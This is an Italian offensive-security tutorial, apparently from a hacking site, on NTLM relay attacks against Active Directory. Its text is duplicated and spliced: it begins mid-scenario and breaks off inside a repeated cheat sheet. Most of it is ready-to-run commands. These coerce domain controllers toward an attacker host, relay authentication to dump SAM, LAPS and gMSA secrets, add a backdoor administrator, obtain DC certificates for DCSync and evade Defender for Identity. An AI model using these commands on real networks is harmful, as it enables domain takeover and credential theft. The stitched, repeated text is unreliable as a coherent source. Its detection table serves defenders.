# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'P\@ss123' --cert-outfile-path /tmp/dc01

# Cross-protocol SMB → LDAPS (rimuovi MIC)

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --remove-mic --delegate-access

# Con IPv6/mitm6

sudo ntlmrelayx.py -6 -t ldaps\://10.10.10.5 -smb2support --delegate-access

```

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
